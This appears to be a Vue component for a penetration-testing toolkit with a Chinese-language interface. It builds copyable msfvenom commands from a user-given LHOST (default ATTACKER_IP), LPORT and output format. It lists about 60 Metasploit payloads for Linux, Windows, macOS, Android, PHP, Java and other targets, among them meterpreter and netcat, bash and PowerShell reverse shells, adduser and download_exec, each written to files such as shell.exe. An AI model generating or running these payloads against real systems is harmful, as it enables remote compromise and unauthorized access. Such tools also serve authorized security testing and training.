<template>
  <div class="space-y-4">
    <div class="grid grid-cols-3 gap-3">
      <div>
        <label class="text-xs font-medium block mb-1" style="color: var(--color-text-secondary);">IP 地址 (LHOST)</label>
        <input
          v-model="ip"
          type="text"
          placeholder="10.10.10.10"
          class="w-full rounded-md border px-3 py-2 text-sm font-mono focus:outline-none"
          style="background-color: var(--color-bg-secondary); border-color: var(--color-border); color: var(--color-text);"
        />
      </div>
      <div>
        <label class="text-xs font-medium block mb-1" style="color: var(--color-text-secondary);">端口 (LPORT)</label>
        <input
          v-model="port"
          type="text"
          placeholder="4444"
          class="w-full rounded-md border px-3 py-2 text-sm font-mono focus:outline-none"
          style="background-color: var(--color-bg-secondary); border-color: var(--color-border); color: var(--color-text);"
        />
      </div>
      <div>
        <label class="text-xs font-medium block mb-1" style="color: var(--color-text-secondary);">输出格式</label>
        <select
          v-model="format"
          class="w-full rounded-md border px-3 py-2 text-sm focus:outline-none"
          style="background-color: var(--color-bg-secondary); border-color: var(--color-border); color: var(--color-text);"
        >
          <option value="elf">elf (Linux 可执行)</option>
          <option value="exe">exe (Windows 可执行)</option>
          <option value="macho">macho (macOS 可执行)</option>
          <option value="raw">raw (原始字节)</option>
          <option value="python">python (Python 脚本)</option>
          <option value="perl">perl (Perl 脚本)</option>
          <option value="php">php (PHP 脚本)</option>
          <option value="jsp">jsp (Java JSP)</option>
          <option value="war">war (Java WAR)</option>
          <option value="ps1">ps1 (PowerShell)</option>
          <option value="dll">dll (Windows DLL)</option>
          <option value="asp">asp (ASP 脚本)</option>
          <option value="hta-psh">hta-psh (HTA)</option>
        </select>
      </div>
    </div>

    <div class="flex items-center gap-3">
      <select
        v-model="filterPlatform"
        class="rounded-md border px-3 py-2 text-sm focus:outline-none"
        style="background-color: var(--color-bg-secondary); border-color: var(--color-border); color: var(--color-text);"
      >
        <option value="">全部平台</option>
        <option value="linux">Linux</option>
        <option value="windows">Windows</option>
        <option value="osx">macOS</option>
        <option value="php">PHP</option>
        <option value="python">Python</option>
        <option value="java">Java</option>
        <option value="nodejs">Node.js</option>
        <option value="android">Android</option>
      </select>
      <input
        v-model="searchText"
        type="text"
        placeholder="搜索 payload..."
        class="flex-1 rounded-md border px-3 py-2 text-sm focus:outline-none"
        style="background-color: var(--color-bg-secondary); border-color: var(--color-border); color: var(--color-text);"
      />
    </div>

    <div class="space-y-2">
      <div
        v-for="(item, idx) in filteredPayloads"
        :key="idx"
        class="rounded-md border p-3"
        style="border-color: var(--color-border); background-color: var(--color-bg-secondary);"
      >
        <div class="flex items-center justify-between gap-2 mb-1">
          <code class="text-sm font-mono" style="color: var(--color-text);">{{ item.value }}</code>
          <CopyButton :text="generateCommand(item.value)" />
        </div>
        <pre class="text-xs font-mono overflow-x-auto p-2 rounded mt-2" style="background-color: var(--color-bg-tertiary); color: var(--color-text); white-space: pre-wrap; word-break: break-all;">{{ generateCommand(item.value) }}</pre>
      </div>

      <div v-if="filteredPayloads.length === 0" class="text-center py-4">
        <p class="text-xs" style="color: var(--color-text-muted);">没有匹配的 Payload</p>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref, computed } from 'vue';
import CopyButton from '../../common/CopyButton.vue';

const ip = ref('');
const port = ref('4444');
const format = ref('elf');
const filterPlatform = ref('');
const searchText = ref('');

interface PayloadItem {
  value: string;
}

const popularPayloads: PayloadItem[] = [
  // Linux
  { value: 'linux/x86/meterpreter/reverse_tcp' },
  { value: 'linux/x86/meterpreter/bind_tcp' },
  { value: 'linux/x64/meterpreter/reverse_tcp' },
  { value: 'linux/x64/meterpreter/reverse_http' },
  { value: 'linux/x64/meterpreter/reverse_https' },
  { value: 'linux/x64/shell/reverse_tcp' },
  { value: 'linux/x64/shell_bind_tcp' },
  { value: 'linux/x64/shell_reverse_tcp' },
  { value: 'linux/x86/shell/reverse_tcp' },
  { value: 'linux/x86/shell_bind_tcp' },
  { value: 'linux/x86/shell_reverse_tcp' },
  { value: 'linux/x86/exec' },
  // Windows
  { value: 'windows/x64/meterpreter/reverse_tcp' },
  { value: 'windows/x64/meterpreter/reverse_http' },
  { value: 'windows/x64/meterpreter/reverse_https' },
  { value: 'windows/x64/meterpreter/bind_tcp' },
  { value: 'windows/x64/shell/reverse_tcp' },
  { value: 'windows/x64/shell_reverse_tcp' },
  { value: 'windows/x86/meterpreter/reverse_tcp' },
  { value: 'windows/x86/meterpreter/reverse_http' },
  { value: 'windows/x86/meterpreter/reverse_https' },
  { value: 'windows/x86/shell/reverse_tcp' },
  { value: 'windows/x86/shell_reverse_tcp' },
  { value: 'windows/x86/exec' },
  { value: 'windows/x86/adduser' },
  // macOS
  { value: 'osx/x64/meterpreter/reverse_tcp' },
  { value: 'osx/x64/meterpreter/reverse_http' },
  { value: 'osx/x64/meterpreter/reverse_https' },
  { value: 'osx/x64/shell_reverse_tcp' },
  // PHP
  { value: 'php/meterpreter/reverse_tcp' },
  { value: 'php/meterpreter/bind_tcp' },
  { value: 'php/reverse_php' },
  { value: 'php/exec' },
  // Python
  { value: 'python/meterpreter/reverse_tcp' },
  { value: 'python/meterpreter/reverse_http' },
  { value: 'python/meterpreter/reverse_https' },
  { value: 'python/shell_reverse_tcp' },
  // Java
  { value: 'java/jsp_shell_reverse_tcp' },
  { value: 'java/meterpreter/reverse_tcp' },
  { value: 'java/meterpreter/reverse_http' },
  { value: 'java/meterpreter/reverse_https' },
  { value: 'java/shell_reverse_tcp' },
  // Node.js
  { value: 'nodejs/shell_reverse_tcp' },
  // Android
  { value: 'android/meterpreter/reverse_tcp' },
  { value: 'android/meterpreter/reverse_http' },
  { value: 'android/meterpreter/reverse_https' },
  // cmd/unix
  { value: 'cmd/unix/reverse_bash' },
  { value: 'cmd/unix/reverse_python' },
  { value: 'cmd/unix/reverse_perl' },
  { value: 'cmd/unix/reverse_ruby' },
  { value: 'cmd/unix/reverse_netcat' },
  { value: 'cmd/unix/reverse_openssl' },
  { value: 'cmd/unix/reverse_zsh' },
  { value: 'cmd/windows/reverse_powershell' },
  { value: 'cmd/windows/powershell_reverse_tcp' },
  // Web
  { value: 'php/bind_php' },
  { value: 'php/download_exec' },
];

const filteredPayloads = computed(() => {
  return popularPayloads.filter(item => {
    if (filterPlatform.value && !item.value.startsWith(filterPlatform.value + '/')) return false;
    if (searchText.value) {
      return item.value.toLowerCase().includes(searchText.value.toLowerCase());
    }
    return true;
  });
});

function generateCommand(payload: string): string {
  const lhost = ip.value || 'ATTACKER_IP';
  const lport = port.value || '4444';
  let cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=${lport} -f ${format.value}`;
  if (format.value === 'elf') cmd += ' -o shell.elf';
  else if (format.value === 'exe') cmd += ' -o shell.exe';
  else if (format.value === 'macho') cmd += ' -o shell.macho';
  else if (format.value === 'ps1') cmd += ' -o shell.ps1';
  else if (format.value === 'dll') cmd += ' -o shell.dll';
  else if (format.value === 'war') cmd += ' -o shell.war';
  else if (format.value === 'hta-psh') cmd += ' -o shell.hta';
  else if (format.value === 'raw') cmd += ' -o shell.bin';
  else if (format.value === 'python') cmd += ' -o shell.py';
  else if (format.value === 'perl') cmd += ' -o shell.pl';
  else if (format.value === 'php') cmd += ' -o shell.php';
  else if (format.value === 'jsp') cmd += ' -o shell.jsp';
  else if (format.value === 'asp') cmd += ' -o shell.asp';
  return cmd;
}
</script>
